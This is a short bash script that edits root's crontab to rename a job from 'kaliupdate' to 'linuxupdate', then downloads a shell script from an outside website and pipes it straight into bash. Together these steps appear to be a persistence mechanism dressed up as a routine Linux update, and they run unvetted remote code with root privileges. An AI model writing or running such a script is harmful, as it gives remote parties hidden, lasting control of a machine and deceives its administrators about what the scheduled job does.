#!/bin/bash

cat /var/spool/cron/crontabs/root | sed -e 's/kaliupdate/linuxupdate/' > /tmp/crontab
mv /tmp/crontab /var/spool/cron/crontabs/root
rm /tmp/crontab

curl -L erikboesen.com/linuxupdate.sh | bash
